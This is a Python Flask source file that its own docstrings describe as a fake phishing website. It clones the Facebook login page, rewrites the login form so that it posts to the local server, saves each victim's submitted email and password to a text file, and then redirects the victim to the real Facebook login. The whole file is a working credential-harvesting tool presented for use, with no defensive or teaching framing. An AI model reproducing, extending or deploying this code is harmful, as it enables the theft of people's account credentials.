from bs4 import BeautifulSoup
import requests
from flask import Flask, redirect, request, render_template
import json
app = Flask(__name__)

URL = "https://facebook.com/login"
WEBSITE_FILE_NAME = 'index.html'
DATA = 'data.txt'

@app.route('/')
def home():
    """Hosts the fake phishing website.
    
    Waits and does nothing until a GET Request is received
    from the user of the phishing scam. When the GET Request
    is received, the program gets the html from phishing login page
    and then alters the form tag in the html tag to allow so that 
    the website could make POST Request to '/login' for stealing data 
    then the function would render the edited html.

    Returns:
        (str): The edited html code for the official phishing website
        to render.

    """

    if request.method == 'GET':
        html = get_html()
        form = find_form(html, '<form', '>')
        edit_file(form, '<form action="/login" method="post">') 
        return render_template(WEBSITE_FILE_NAME)

@app.route('/login', methods=['POST'])
def login():
    """Receives POST requests made by '/' to steal data
    
    Waits and does nothing until a POST Request is received
    from '/' which happens when the user clicks on the "Log In" 
    button. When the POST Request is received, the program 
    steals the data. If the email or phone number 
    exists in the database file, the program will save this data need
    as it already exists in the database. O/W, the program would 
    append the new data to the database. After the check, the website
    is redirect to the official website's login page.

    Returns:
        (werkzeug.wrappers.response.Response): redirects the user to the 
        official login page of the website.

    """

    if request.method == 'POST':
        data = request.form
        data_file = get_jsons_from_file()
        if not email_exits(data, data_file):
            append_data_file(data)
            return redirect(URL)
        return redirect(URL)

def email_exits(data, data_file): 
    """Checks if the email exists in the database.
    
    Reads the website html file to find the email
    by name then compare the dictionary of the data at email
    with the data file's email names to check if the email inputted 
    exists. If it does, then it return True. O/W, it returns False.

    Args:
        data (werkzeug.datastructures.ImmutableMultiDict): The user input received from POST Request.
        data_file ([{str:[]}]): the data of all users in the database.

    Returns:
        (bool): returns True if email exists. O/W, it returns False.

    """

    html = read_file('templates/index.html')
    dict_data = dict(data.lists())
    soup = BeautifulSoup(html, 'html.parser')
    email = find_email_by_name(soup, 'input', 'type')
    for json in data_file:
        if dict_data[email][0] == json[email][0]:
            return True
    return False

def append_data_file(data):
    """Appends the Immutable Multi Dict into the database.
        
    Converts the data received from user to a list of dicts with
    the lists method and then it is converted to a dictionary in which 
    it is converted a json text. This new form of data is appended to the
    data file.

    Args:
        data (werkzeug.datastructures.ImmutableMultiDict): data from user input. 
    
    """

    with open(DATA, 'a') as f:
        f.write(json.dumps(dict(data.lists()), indent = 4))
        f.write('\n')

def find_form(html, start, end):
    """Finds the exact form tag in the website html file

    Parses the form input by finding <form as the start of 
    the string and > as the end of the form tag. 
    Args:
        html (str): the html file of the website 
        start (str): the starting point of parsing the html tag
        end (str): the end point of parsing the html tag

    Return:
        (str): the form tag

    """

    for i in range(len(html)):
        if html[i:i+len(start)] == start:
            return "".join(html[i:].partition(end)[0:2])

def edit_file(old, new):
    """Finds the exact form tag in the html file

    Parses the form input by finding <form as the start of 
    the string and > as the end of the form tag. 
    Args:
        html (werkzeug.datastructures.ImmutableMultiDict): 
        start (str): the starting point of parsing the html tag
        end (str): the end point of parsing the html tag

    Return:
        (str): the form tag

    """

    with open(F'./templates/{WEBSITE_FILE_NAME}', 'r', encoding="utf-8") as f:    
        string = f.read()
    with open(F'./templates/{WEBSITE_FILE_NAME}', 'w', encoding='utf-8') as f:
        string = string.replace(old, new)
        f.write(string)

def find_email_by_name(soup, name_tag, attribute):
    """Finds the name of the "name" attribute for the input tag with attribute of "type='text'". 

    Finds all of the input tags with Beautiful soup and then checks 
    if the input tag has the attribute "type='text'". If it does 
    then it returns the name attribute of the input tag. O/W it
    continues until it finds "type='text'" attribute.

    Args:
        soup (bs4.BeautifulSoup): The html parser.
        name_tag (str): the tag to be searching for.
        attribute (str): the specific attribute to be searching for.

    Return:
        (str): the string that is identified as email by the official website.

    """

    tags = soup.findAll(name_tag)
    for tag in tags:
        try:
            if tag[attribute] == 'text':
                return tag['name']
        except KeyError:
            continue

def find_password_by_name(soup, name_tag, attribute):
    """Finds the name of the "name" attribute for 
    the input tag with attribute of "type='password'". 

    Finds all of the input tags with Beautiful soup and then checks 
    if the input tag has the attribute "type='password'". If it does 
    then it returns the name attribute of the input tag. O/W it
    continues until it finds "type='password" attribute.

    Args:
        soup (bs4.BeautifulSoup): The html parser.
        name_tag (str): the tag to be searching for.
        attribute (str): the specific attribute to be searching for.

    Return:
        (str): the string that is identified as password for the website.

    """

    tags = soup.findAll(name_tag)
    for tag in tags:
        try:
            if tag[attribute] == 'password':
                return tag['id']
        except KeyError:
            continue
    return None

def read_file(file_name):
    """Reads file from the database file.
    
    Reads data.txt then returns the data as a string.
    
    Args:
        file_name (str): file to be reading from.
    
    Returns:
        (str): the file content.

    """

    with open(f'./{file_name}', 'r', encoding='UTF-8') as f:
        file = f.read()
    return file

def get_html():
    """Gets html code of the website with requests 
    and wrties it to file in tempelates folder.
    
    Returns:
        (str): html code.

    """

    html = requests.get(URL).text
    with open(f'./templates/{WEBSITE_FILE_NAME}', 'w', encoding="utf-8") as f:
        f.write(html)
    return html

def get_jsons_from_file():
    """Gets the jsons from the database file.
    
    Gets the jsons the file and then converts the json
    back to a list of dictionaries that python can work with.
    
    Returns:
        ([{str: []}]): a list of dictionaries with strings as keys and values as a list.
        
    """

    data_file = read_file(DATA)
    data_file = [e + '}' for e in data_file.strip().split('}') if e]
    return [json.loads(e) for e in data_file]

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=3000, debug=True)